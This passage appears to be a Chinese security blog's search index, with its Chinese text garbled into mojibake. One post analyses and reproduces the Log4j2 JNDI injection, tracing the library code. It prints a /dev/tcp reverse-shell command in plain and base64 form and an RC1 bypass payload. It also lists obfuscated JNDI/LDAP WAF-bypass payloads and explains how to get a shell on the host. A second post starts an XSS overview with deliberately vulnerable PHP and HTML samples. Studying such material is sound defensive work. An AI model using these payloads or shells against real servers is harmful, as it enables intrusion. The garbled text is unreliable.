ç­‰å…¨éƒ¨æ–¹æ³•å‡å¯ä»¥ä½œä¸ºæœ¬æ¬¡æ¼æ´çš„è§¦å‘ç‚¹ï¼Œåªæ˜¯å–å†³äºé…ç½®çš„æ¼æ´è¾“å‡ºç­‰çº§ã€‚\nå¯ä»¥çœ‹åˆ°AbstarctLoogerå®é™…ä¸Šæ˜¯å®ç°äº†Loggeræä¾›çš„æ¥å£ã€‚\næ¶ˆæ¯æ ¼å¼åŒ– è¿™é‡Œæ˜¯è°ƒç”¨MessagePatternConverteré‡Œé¢çš„formatæ–¹æ³•æ¥å®ç°æ ¼å¼åŒ–ã€‚\nLog4j2 ä½¿ç”¨ org.apache.logging.log4j.core.pattern.MessagePatternConverter æ¥å¯¹æ—¥å¿—æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œåœ¨å®ä¾‹åŒ– MessagePatternConverter æ—¶ä¼šä» Properties åŠ Options ä¸­è·å–é…ç½®æ¥åˆ¤æ–­æ˜¯å¦éœ€è¦æä¾› Lookups åŠŸèƒ½ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 public static final boolean FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(\u0026#34;log4j2.formatMsgNoLookups\u0026#34;, false); private MessagePatternConverter(final Configuration config, final String[] options) { super(\u0026#34;Message\u0026#34;, \u0026#34;message\u0026#34;); this.formats = options; this.config = config; int noLookupsIdx = this.loadNoLookups(options); this.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx \u0026gt;= 0; this.textRenderer = this.loadMessageRenderer(noLookupsIdx \u0026gt;= 0 ? (String[])ArrayUtils.remove(options, noLookupsIdx) : options); } å¯ä»¥çœ‹åˆ°åœ¨2.14.1ç‰ˆæœ¬çš„log4j2å®ƒé»˜è®¤çš„log4j2.formatMsgLookupsé…ç½®å€¼ä¸ºfalseï¼Œå› æ­¤LookupsåŠŸèƒ½é»˜è®¤æ˜¯å¼€å¯çš„ã€‚\nç„¶åæŸ¥çœ‹formatæ–¹æ³•ï¼Œè°ƒç”¨StrSubsitutoræ–¹æ³•è¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢\nå­—ç¬¦ä¸²æ›¿æ¢ Log4j2 æä¾› Lookup åŠŸèƒ½çš„å­—ç¬¦æ›¿æ¢çš„å…³é”®å¤„ç†ç±»ï¼Œä½äºorg.apache.logging.log4j.core.lookup.StrSubstitutorï¼Œé¦–å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»ã€‚\nç±»ä¸­æä¾›äº†å…³é”®çš„ DEFAULT_ESCAPE æ˜¯ $ï¼ŒDEFAULT_PREFIX å‰ç¼€æ˜¯ ${ï¼ŒDEFAULT_SUFFIX åç¼€æ˜¯ }ï¼ŒDEFAULT_VALUE_DELIMITER_STRING èµ‹å€¼åˆ†éš”ç¬¦æ˜¯ :-ï¼ŒESCAPE_DELIMITER_STRING æ˜¯ :\\-ã€‚\nç„¶åé€šè¿‡StrSubstitutoråˆå§‹åŒ–çš„æ„é€ å™¨ï¼Œå°†prefixMatherã€suffixMatcherã€escapeCharè¿›è¡Œèµ‹å€¼\nè¿™ä¸ªç±»æä¾›äº†substituteæ–¹æ³•ï¼Œæ˜¯æ•´ä¸ªLookupåŠŸèƒ½çš„æ ¸å¿ƒï¼Œç”¨æ¥é€’å½’æ›¿æ¢ç›¸åº”çš„å­—ç¬¦ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹é€»è¾‘ã€‚\né€šè¿‡whileå¾ªç¯é€ä¸ªå­—ç¬¦å¯»æ‰¾${å‰ç¼€ã€‚\nposä¸ºå½“å‰å­—ç¬¦ä¸²å¤´æŒ‡é’ˆï¼ŒprefixMatcher.isMatchåªè´Ÿè´£åŒ¹é… ${ ä¸¤ä¸ªå­—ç¬¦ã€‚å¦‚æœåŒ¹é…åˆ°å°±è¿›å…¥ç¬¬äºŒå±‚å¾ªç¯åŒ¹é…ï¼ŒåŸç†å’Œä»£ç ç›¸ä¼¼ã€‚å¦‚æœæ²¡æœ‰åŒ¹é…åˆ°**}**å­—ç¬¦ï¼ŒposæŒ‡é’ˆå°±æ­£å¸¸+1ã€‚\næ‰¾åˆ°å‰ç¼€åå¼€å§‹å¯»æ‰¾åç¼€ï¼Œä½†æ˜¯åœ¨æ‰¾åç¼€çš„whileå¾ªç¯é‡Œé¢ï¼Œåˆåˆ¤æ–­äº†æ˜¯å¦æ›¿æ¢å˜é‡ä¸­çš„å€¼ï¼Œå¦‚æœæ›¿æ¢ï¼Œå†åŒ¹é…ä¸€æ¬¡å‰ç¼€ï¼Œå¦‚æœåˆæ‰¾åˆ°äº†å‰ç¼€ï¼Œåˆ™continueè·³å‡ºå¾ªç¯ï¼Œå†èµ°ä¸€æ¬¡æ‰¾åç¼€çš„é€»è¾‘ï¼Œç”¨æ¥æ»¡è¶³å˜é‡ä¸­åµŒå¥—çš„è¿‡ç¨‹ã€‚\næ‰¾åç¼€}çš„ä»£ç \nåç»­çš„å¤„ç†ä¸­ï¼Œé€šè¿‡å¤šä¸ª if/else ç”¨æ¥åŒ¹é… :- å’Œ :\\-ã€‚\n:- æ˜¯ä¸€ä¸ªèµ‹å€¼å…³é”®å­—ï¼Œå¦‚æœç¨‹åºå¤„ç†åˆ° ${aaaa:-bbbb} è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œå¤„ç†çš„ç»“æœå°†ä¼šæ˜¯ bbbbï¼Œ:- å…³é”®å­—å°†ä¼šè¢«æˆªå–æ‰ï¼Œè€Œä¹‹å‰çš„å­—ç¬¦ä¸²éƒ½ä¼šè¢«èˆå¼ƒæ‰ã€‚ :\\- æ˜¯è½¬ä¹‰çš„ :-ï¼Œå¦‚æœä¸€ä¸ªç”¨ a:b è¡¨ç¤ºçš„é”®å€¼å¯¹çš„ key a ä¸­åŒ…å« :ï¼Œåˆ™éœ€è¦ä½¿ç”¨è½¬ä¹‰æ¥é…åˆå¤„ç†ï¼Œä¾‹å¦‚ ${aaa:\\\\-bbb:-ccc}ï¼Œä»£è¡¨ key æ˜¯ï¼Œaaa:bbbï¼Œvalue æ˜¯ cccã€‚ åœ¨æ²¡æœ‰åŒ¹é…åˆ°å˜é‡èµ‹å€¼æˆ–å¤„ç†ç»“æŸåï¼Œå°†ä¼šè°ƒç”¨ resolveVariable æ–¹æ³•è§£ææ»¡è¶³ Lookup åŠŸèƒ½çš„è¯­æ³•ï¼Œå¹¶æ‰§è¡Œç›¸åº”çš„ lookup ï¼Œå°†è¿”å›çš„ç»“æœæ›¿æ¢å›åŸå­—ç¬¦ä¸²åï¼Œå†æ¬¡è°ƒç”¨ substitute æ–¹æ³•è¿›è¡Œé€’å½’è§£æã€‚\nç»§ç»­æˆªå–${}ä¸­çš„å†…å®¹ï¼Œä¸»è¦æ˜¯ä¸ºäº†åˆ¤æ–­æ˜¯å¦è¿˜æœ‰${} å› æ­¤åœ¨å­—ç¬¦ä¸²æ›¿æ¢çš„è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ–¹æ³•æä¾›äº†ä¸€äº›ç‰¹æ®Šçš„å†™æ³•ï¼Œå¹¶æ”¯æŒé€’å½’è§£æã€‚è€Œè¿™äº›ç‰¹æ€§ï¼Œå°†ä¼šå¯ä»¥ç”¨æ¥è¿›è¡Œç»•è¿‡ WAFã€‚\nresolveVariable åˆ™è°ƒç”¨ this.variableResolver#lookup æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œè€Œè¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ªä»£ç†ç±» Interpolatorï¼Œè¿™ä¸ªç±»åœ¨æ¥ä¸‹æ¥çš„å†…å®¹è¿›è¡Œè¯´æ˜\nLookupå¤„ç† ç”±ä¸Šé¢çš„å‡½æ•°æ ˆè°ƒç”¨ï¼Œæˆ‘ä»¬çŸ¥é“log4j2ä½¿ç”¨org.apache.logging.log4j.core.lookup.Interpolator ç±»æ¥ä»£ç†æ‰€æœ‰çš„ StrLookup å®ç°ç±»ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨å®é™…ä½¿ç”¨ Lookup åŠŸèƒ½æ—¶ï¼Œç”± Interpolator è¿™ä¸ªç±»æ¥å¤„ç†å’Œåˆ†å‘ã€‚\nè¿™ä¸ªç±»åœ¨åˆå§‹åŒ–æ—¶åˆ›å»ºäº†ä¸€ä¸ª strLookupMap ï¼Œå°†ä¸€äº› lookup åŠŸèƒ½å…³é”®å­—å’Œå¤„ç†ç±»è¿›è¡Œäº†æ˜ å°„ï¼Œå­˜æ”¾åœ¨è¿™ä¸ª Map ä¸­ã€‚\né»˜è®¤æ˜¯åŠ å…¥ log4jã€sysã€envã€mainã€markerã€javaã€lowerã€upperã€jndiã€jvmrunargsã€springã€kubernetesã€dockerã€webã€dateã€ctxï¼Œç”±äºéƒ¨åˆ†åŠŸèƒ½çš„æ”¯æŒå¹¶ä¸åœ¨ core åŒ…ä¸­ï¼Œæ‰€ä»¥å¦‚æœåŠ è½½ä¸åˆ°å¯¹åº”çš„å¤„ç†ç±»ï¼Œåˆ™ä¼šæ·»åŠ è­¦å‘Šä¿¡æ¯å¹¶è·³è¿‡ã€‚è€Œè¿™äº›ä¸åŒ Lookup åŠŸèƒ½çš„æ”¯æŒï¼Œæ˜¯éšç€ç‰ˆæœ¬æ›´æ–°çš„ã€‚\nå¤„ç†å’Œåˆ†å‘çš„å…³é”®é€»è¾‘åœ¨äºå…¶ lookup æ–¹æ³•ï¼Œé€šè¿‡ : ä½œä¸ºåˆ†éš”ç¬¦æ¥åˆ†éš” Lookup å…³é”®å­—åŠå‚æ•°ï¼Œä»strLookupMap ä¸­æ ¹æ®å…³é”®å­—ä½œä¸º key åŒ¹é…åˆ°å¯¹åº”çš„å¤„ç†è§£æç±»ï¼Œå¹¶è°ƒç”¨å…¶ lookup æ–¹æ³•ã€‚\næœ¬æ¬¡æ¼æ´çš„è§¦å‘æ–¹å¼æ˜¯ä½¿ç”¨ jndi: å…³é”®å­—æ¥è§¦å‘ JNDI æ³¨å…¥æ¼æ´ï¼Œå¯¹äº jndi: å…³é”®å­—çš„å¤„ç†ç±»ä¸º org.apache.logging.log4j.core.lookup.JndiLookup ã€‚çœ‹ä¸€ä¸‹æœ€å…³é”®çš„ lookup æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä½¿ç”¨äº† JndiManager æ¥æ”¯æŒ JNDI çš„æŸ¥è¯¢åŠŸèƒ½ã€‚\nJDNIæŸ¥è¯¢ Log4j2 ä½¿ç”¨ org.apache.logging.log4j.core.net.JndiManager æ¥æ”¯æŒ JDNI ç›¸å…³æ“ä½œã€‚\nJndiManager ä½¿ç”¨ç§æœ‰å†…éƒ¨ç±» JndiManagerFactory æ¥åˆ›å»º JndiManager å®ä¾‹ï¼Œå¦‚ä¸‹å›¾ï¼š\nå¯ä»¥çœ‹åˆ°æ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ InitialContext å®ä¾‹ï¼Œå¹¶ä½œä¸ºå‚æ•°ä¼ é€’ç”¨æ¥åˆ›å»º JndiManagerï¼Œè¿™ä¸ª Context è¢«ä¿å­˜åœ¨æˆå‘˜å˜é‡ context ä¸­ï¼š\nJndiManager#lookup æ–¹æ³•åˆ™è°ƒç”¨ this.context.lookup() å®ç° JNDI æŸ¥è¯¢æ“ä½œã€‚\næœ€ç»ˆé€ æˆJNDIæ³¨å…¥\n0x05 æ¼æ´åˆ©ç”¨ æˆ‘ä»¬è¿™é‡Œå°±é‡‡ç”¨ç®€å•çš„åå¼¹shellæ‹¿åˆ°æƒé™å³å¯ã€‚\n1 2 3 4 åå¼¹shellå‘½ä»¤ï¼š bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/8899 0\u0026gt;\u0026amp;1 base64åŠ å¯†ï¼š bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg5OSAwPiYx}|{base64,-d}|{bash,-i} 0x06 ç»•è¿‡å§¿åŠ¿ Rc1 ç»•è¿‡ rc1æ›´æ–°\nç§»é™¤äº†ä» Properties ä¸­è·å– Lookup é…ç½®çš„é€‰é¡¹ï¼Œå¹¶ä¿®æ”¹åˆ¤æ–­é€»è¾‘ï¼Œé»˜è®¤ä¸å¼€å¯ lookup åŠŸèƒ½ã€‚ JndiManager#lookup æ–¹æ³•ä¸­æ·»åŠ äº†æ ¡éªŒï¼Œä½¿ç”¨äº† JndiManagerFactory æ¥åˆ›å»º JndiManager å®ä¾‹ï¼Œä¸å†ä½¿ç”¨ InitialContextï¼Œè€Œæ˜¯ä½¿ç”¨å­ç±» InitialDirContextï¼Œå¹¶ä¸ºå…¶æ·»åŠ ç™½åå• JNDI åè®®ã€ç™½åå•ä¸»æœºåã€ç™½åå•ç±»åã€‚ æ¼æ´ç‚¹\nåœ¨å…³é”®çš„ lookup å‡½æ•°ä¸­åŠ å…¥äº†æ ¡éªŒåˆ¤æ–­ï¼Œä½†æ˜¯ç”±äºæ ¡éªŒé€»è¾‘æœ‰è¯¯ï¼Œç¨‹åºåœ¨ catch ä½å¼‚å¸¸åæ²¡æœ‰ returnï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨ URISyntaxException å¼‚å¸¸æ¥ç»•è¿‡æ ¡éªŒï¼Œç›´æ¥èµ°åˆ°åé¢çš„ lookupã€‚ å› æ­¤ï¼Œåªè¦åœ¨åˆ¤æ–­æ—¶è§¦å‘ URISyntaxException å¼‚å¸¸ï¼Œä¾‹å¦‚åœ¨ URI ä¸­æ’å…¥ç©ºæ ¼ï¼Œå³å¯è§¦å‘æ¼æ´,payloadå¦‚ä¸‹:${jndi:ldap://127.0Ã¥.0.1:1389/ badClassName}ä¸å¯¹ç©ºæ ¼åšç¼–ç å¯¼è‡´å¼‚å¸¸ï¼Œä½†æ˜¯lookupæ—¶å€™ä¼šå»æ‰è¿™ä¸ªç©ºæ ¼ï¼‰ RC2ä¿®å¤ RC2çš„ä¿®å¤æ–¹æ¡ˆæ˜¯ç›´æ¥returnï¼Œæœ‰æ•ˆè§£å†³äº†ä¸Šæ–‡çš„ç»•è¿‡\n1 2 3 4 5 6 try{ } catch (URISyntaxException ex) { LOGGER.warn(\u0026#34;Invalid JNDI URI - {}\u0026#34;, name); return null; } return (T) this.context.lookup(name); å¤šä¸ª${}æ‰§è¡Œæµç¨‹ Ã¥\nå…ˆæ¥åˆ†æä¸€ä¸‹å¤šä¸ª${}çš„æ‰§è¡Œæµç¨‹ï¼ŒPayloadä¸¾ä¾‹å¦‚ä¸‹ï¼š\n${aaa:${bbb:ccc}dd}${ee:ff}\nå½“è¯†åˆ«åˆ°å¤šä¸ª${}æ—¶ï¼Œå‡†å¤‡æ¥è¯´æ˜¯è¯†åˆ«åˆ°å¤šä¸ª${æ—¶ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š\nå½“å±äºåµŒå¥—ç±»å‹æ—¶ï¼Œæ¯”å¦‚${${}}ï¼Œå‚æ•°nestedVarCountä¼šæ‰§è¡Œ+1æ“ä½œï¼Œè¡¨ç¤ºå­˜åœ¨åµŒå¥—ï¼Œé˜²æ­¢æ‰¾é”™é—­åˆæ—¶ç”¨çš„}ï¼Œä¼šå…ˆå¤„ç†å†…éƒ¨çš„${}ï¼Œå†å°†å¤„ç†ç»“æœè¿”å›åç»§ç»­å¤„ç†${} ï¼›å…·ä½“çš„åŸå› ï¼Œå°±æ˜¯å› ä¸ºä¼šé€’å½’è°ƒç”¨substitute()`ï¼Œæ‰€ä»¥ä¼šå…ˆæŠŠå†…éƒ¨çš„å¤„ç†å®Œã€‚\nå½“å±äºå¹¶åˆ—ç±»å‹æ—¶ï¼Œæ¯”å¦‚${}${}ï¼Œä¼šä¾æ¬¡å¤„ç†${}ï¼›å› ä¸ºä»–ä¸€æ¬¡åªä¼šæå–ä¸€æ•´ä¸ª${}ã€‚\nåˆ†éš”ç¬¦ org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute()é‡Œå¤„ç†å®Œ${}åï¼Œå°±ä¼šæœ‰ä¸€éƒ¨åˆ†çš„åˆ†éš”ç¬¦å¤„ç†ï¼Œä¸€ä¸ªæ˜¯valueEscapeDelimiterMatcher [:\\-]ï¼Œå¦ä¸€ä¸ªæ˜¯valueDelimiterMatcher [:-]\nå…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªvalueEscapeDelimiterMatcherï¼Œpayload: ${aa:\\\\-bb}\nä»ä¸‹å›¾å¯ä»¥çœ‹å‡ºæ¥ï¼Œå°±æ˜¯ç»™ :- ä¸­çš„ \\ å»æ‰äº†å˜æˆäº†:-ï¼Œ\nå†æ¥çœ‹çœ‹valueDelimiterMatcherï¼Œpayload ${aa:-bb}\nä»ä¸‹é¢å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¢«:-åˆ†å‰²æˆäº†å‰åä¸¤éƒ¨åˆ†ï¼Œå‰é¢çš„éƒ¨åˆ†èµ‹å€¼ç»™varNameï¼Œåé¢éƒ¨åˆ†èµ‹å€¼ç»™varDefaultValueï¼›\nvarNameä¼šè¢«ä¼ å…¥åˆ°resolveVariable()è¿›è¡Œè§£æï¼Œå¦‚æœæ²¡æœ‰åè®®ä»€ä¹ˆçš„ï¼Œå°±ä¼šè¿”å›null å¦‚æœresolveVariable()è¿”å›å€¼ä¸ºnullï¼ŒvarDefaultValueåœ¨åç»­çš„è¿‡ç¨‹ä¸­ä¹Ÿä¼šé€’å½’è°ƒç”¨substitute æœ€åä¼šè¿”å›varDefaultValueçš„å€¼\nä¸€äº›ç»•è¿‡payload\n1 2 3 4 5 6 7 8 9 ä¸€äº›ç»•è¿‡paylioad ${${a:-j}ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${a:-j}n${::-d}i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:jn}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:${upper:jn}}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} æ„Ÿè§‰ä¸»è¦æ˜¯å¯¹jdniå­—æ®µè¿›è¡Œå¤„ç†çš„ç»•è¿‡ã€‚ 0x07 é”™è¯¯è§£å†³ Reference Class Name: foo æ–¹æ³•ä¸€ 1 å› ä¸ºåœ¨2018å¹´10æœˆï¼ŒJavaæœ€ç»ˆä¹Ÿä¿®å¤äº†è¿™ä¸ªåˆ©ç”¨ç‚¹ï¼Œå¯¹LDAP Referenceè¿œç¨‹å·¥å‚ç±»çš„åŠ è½½å¢åŠ äº†é™åˆ¶11.0.1ã€8u191ã€7u201ã€6u211 com.sun.jndi.ldap.object.trustURLCodebase é»˜è®¤ä¸ºfalse æˆ‘ä»¬è¿™é‡Œjavaç‰ˆæœ¬ä¸º: ç‰ˆæœ¬æ¯”è¾ƒé«˜ï¼Œæ‰€ä»¥å¯¼è‡´æŠ¥é”™ã€‚\næ‰€ä»¥è¿™é‡Œéœ€è¦åŠ ä¸Šä¸€ä¸‹ä»£ç ï¼šSystem.setProperty(\u0026quot;com.sun.jndi.ldap.object.trustURLCodebase\u0026quot;, \u0026quot;true\u0026quot;);å³å¯å¤ç°æˆåŠŸ\næ–¹æ³•äºŒï¼š å®é™…ä¸Šé™åˆ¶äº†trustURLCodebaseä¸ºFlaseå¹¶ä¸å½±å“å…¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå¼¹shellæ‹¿åˆ°å¼€å¯log4j2æœåŠ¡ä¸»æœºçš„æƒé™ã€‚åªéœ€è¦æŒ‡å®šå‘½ä»¤:bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1å³å¯ã€‚\n0x08 å‚è€ƒèµ„æ–™ https://cloud.tencent.com/developer/article/1987389\nhttps://www.cnblogs.com/hhhhhxian/p/16214263.html\nhttps://su18.org/post/log4j2/\nhttps://www.websecuritys.cn/index.php/archives/576/\nhttps://github.com/welk1n/JNDI-Injection-Exploit\nhttps://mp.weixin.qq.com/s/ZHcrraF2Agk8EEe-3_O18Q\n","permalink":"http://www.reus09.top/posts/tech/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","summary":"0x00 å‰è¨€ æœ€è¿‘æ—¶é—´æ¯”è¾ƒå……æ²›ï¼Œå› æ­¤åœ¨è¿™é‡Œå¤ç°ä¸€äº›æµä¼ æ¯”è¾ƒå¹¿æ³›ã€å±å®³æ€§é«˜çš„æ¼æ´ï¼ŒLog4j2æ¼æ´ä½œä¸º2021å¹´çˆ†å‡ºæ¥çš„CVEæ˜æ˜Ÿï¼Œè‹¦äºå½“æ—¶æ—¶é—´ç´§è¿«ï¼Œ","title":"Log4j2æ¼æ´å¤ç°åŠåŸç†åˆ†æ"},{"content":"ä¸»è¦å¯¹xsså¸¸è§çš„åˆ†ç±»ã€æ”»å‡»æ‰‹æ®µã€‚ä¸»è¦å‚è€ƒctf-wiki-web-xss\nxssæ¦‚å¿µ è·¨ç«™è„šæœ¬ï¼ˆCross-Site Scriptingï¼ŒXSSï¼‰æ˜¯ä¸€ç§ç»å¸¸å‡ºç°åœ¨ WEB åº”ç”¨ç¨‹åºä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œæ˜¯ç”±äº WEB åº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·çš„è¾“å…¥è¿‡æ»¤ä¸è¶³è€Œäº§ç”Ÿçš„ã€‚æ”»å‡»è€…åˆ©ç”¨ç½‘ç«™æ¼æ´æŠŠæ¶æ„çš„è„šæœ¬ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œå½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™äº›ç½‘é¡µæ—¶ï¼Œå°±ä¼šæ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç ï¼Œå¯¹å—å®³ç”¨æˆ·å¯èƒ½é‡‡å– Cookies èµ„æ–™çªƒå–ã€ä¼šè¯åŠ«æŒã€é’“é±¼æ¬ºéª—ç­‰å„ç§æ”»å‡»ã€‚\nxssåˆ†ç±» åå°„å‹XSS åå°„å‹è·¨ç«™è„šæœ¬ï¼ˆReflected Cross-Site Scriptingï¼‰æ˜¯æœ€å¸¸è§ï¼Œä¹Ÿæ˜¯ä½¿ç”¨æœ€å¹¿çš„ä¸€ç§ï¼Œå¯å°†æ¶æ„è„šæœ¬é™„åŠ åˆ° URL åœ°å€çš„å‚æ•°ä¸­ã€‚\nåå°„å‹ XSS çš„åˆ©ç”¨ä¸€èˆ¬æ˜¯æ”»å‡»è€…é€šè¿‡ç‰¹å®šæ‰‹æ³•ï¼ˆå¦‚ç”µå­é‚®ä»¶ï¼‰ï¼Œè¯±ä½¿ç”¨æˆ·å»è®¿é—®ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„ URLï¼Œå½“å—å®³è€…ç‚¹å‡»è¿™äº›ä¸“é—¨è®¾è®¡çš„é“¾æ¥çš„æ—¶å€™ï¼Œæ¶æ„ä»£ç ä¼šç›´æ¥åœ¨å—å®³è€…ä¸»æœºä¸Šçš„æµè§ˆå™¨æ‰§è¡Œã€‚æ­¤ç±» XSS é€šå¸¸å‡ºç°åœ¨ç½‘ç«™çš„æœç´¢æ ã€ç”¨æˆ·ç™»å½•å£ç­‰åœ°æ–¹ï¼Œå¸¸ç”¨æ¥çªƒå–å®¢æˆ·ç«¯ Cookies æˆ–è¿›è¡Œé’“é±¼æ¬ºéª—ã€‚\næœåŠ¡å™¨ç«¯ä»£ç ï¼š\n1 2 3 4 5 6 7 \u0026lt;?php // Is there any input? if( array_key_exists( \u0026#34;name\u0026#34;, $_GET ) \u0026amp;\u0026amp; $_GET[ \u0026#39;name\u0026#39; ] != NULL ) { // Feedback for end user echo \u0026#39;\u0026lt;pre\u0026gt;Hello \u0026#39; . $_GET[ \u0026#39;name\u0026#39; ] . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } ?\u0026gt; å¯ä»¥çœ‹åˆ°ï¼Œä»£ç ç›´æ¥å¼•ç”¨äº† name å‚æ•°ï¼Œå¹¶æ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤å’Œæ£€æŸ¥ï¼Œå­˜åœ¨æ˜æ˜¾çš„ XSS æ¼æ´ã€‚\næŒä¹…å‹XSS æŒä¹…å‹è·¨ç«™è„šæœ¬ï¼ˆPersistent Cross-Site Scriptingï¼‰ä¹Ÿç­‰åŒäºå­˜å‚¨å‹è·¨ç«™è„šæœ¬ï¼ˆStored Cross-Site Scriptingï¼‰ã€‚\næ­¤ç±» XSS ä¸éœ€è¦ç”¨æˆ·å•å‡»ç‰¹å®š URL å°±èƒ½æ‰§è¡Œè·¨ç«™è„šæœ¬ï¼Œæ”»å‡»è€…äº‹å…ˆå°†æ¶æ„ä»£ç ä¸Šä¼ æˆ–å‚¨å­˜åˆ°æ¼æ´æœåŠ¡å™¨ä¸­ï¼Œåªè¦å—å®³è€…æµè§ˆåŒ…å«æ­¤æ¶æ„ä»£ç çš„é¡µé¢å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚æŒä¹…å‹ XSS ä¸€èˆ¬å‡ºç°åœ¨ç½‘ç«™ç•™è¨€ã€è¯„è®ºã€åšå®¢æ—¥å¿—ç­‰äº¤äº’å¤„ï¼Œæ¶æ„è„šæœ¬å­˜å‚¨åˆ°å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡ç«¯çš„æ•°æ®åº“ä¸­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php if( isset( $_POST[ \u0026#39;btnSign\u0026#39; ] ) ) { // Get input $message = trim( $_POST[ \u0026#39;mtxMessage\u0026#39; ] ); $name = trim( $_POST[ \u0026#39;txtName\u0026#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = \u0026#34;INSERT INTO guestbook ( comment, name ) VALUES ( \u0026#39;$message\u0026#39;, \u0026#39;$name\u0026#39; );\u0026#34;; $result = mysql_query( $query ) or die( \u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . mysql_error() . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39; ); //mysql_close(); } ?\u0026gt; ä»£ç åªå¯¹ä¸€äº›ç©ºç™½ç¬¦ã€ç‰¹æ®Šç¬¦å·ã€åæ–œæ è¿›è¡Œäº†åˆ é™¤æˆ–è½¬ä¹‰ï¼Œæ²¡æœ‰åš XSS çš„è¿‡æ»¤å’Œæ£€æŸ¥ï¼Œä¸”å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œæ˜æ˜¾å­˜åœ¨å­˜å‚¨å‹ XSS æ¼æ´ã€‚\nDOMå‹XSS ä¼ ç»Ÿçš„ XSS æ¼æ´ä¸€èˆ¬å‡ºç°åœ¨æœåŠ¡å™¨ç«¯ä»£ç ä¸­ï¼Œè€Œ DOM-Based XSS æ˜¯åŸºäº DOM æ–‡æ¡£å¯¹è±¡æ¨¡å‹çš„ä¸€ç§æ¼æ´ï¼Œæ‰€ä»¥ï¼Œå—å®¢æˆ·ç«¯æµè§ˆå™¨çš„è„šæœ¬ä»£ç æ‰€å½±å“ã€‚å®¢æˆ·ç«¯ JavaScript å¯ä»¥è®¿é—®æµè§ˆå™¨çš„ DOM æ–‡æœ¬å¯¹è±¡æ¨¡å‹ï¼Œå› æ­¤èƒ½å¤Ÿå†³å®šç”¨äºåŠ è½½å½“å‰é¡µé¢çš„ URLã€‚æ¢å¥è¯è¯´ï¼Œå®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡ DOM åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæœåŠ¡å™¨ç«¯çš„æ•°æ®ï¼Œè€Œä»å®¢æˆ·ç«¯è·å¾— DOM ä¸­çš„æ•°æ®ï¼ˆå¦‚ä» URL ä¸­æå–æ•°æ®ï¼‰å¹¶åœ¨æœ¬åœ°æ‰§è¡Œã€‚å¦ä¸€æ–¹é¢ï¼Œæµè§ˆå™¨ç”¨æˆ·å¯ä»¥æ“çºµ DOM ä¸­çš„ä¸€äº›å¯¹è±¡ï¼Œä¾‹å¦‚ URLã€location ç­‰ã€‚ç”¨æˆ·åœ¨å®¢æˆ·ç«¯è¾“å…¥çš„æ•°æ®å¦‚æœåŒ…å«äº†æ¶æ„ Java\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;DOM-XSS test\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var a=document.URL; document.write(a.substring(a.indexOf(\u0026#34;a=\u0026#34;)+2,a.length)); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°†ä»£ç ä¿å­˜åœ¨ domXSS.html 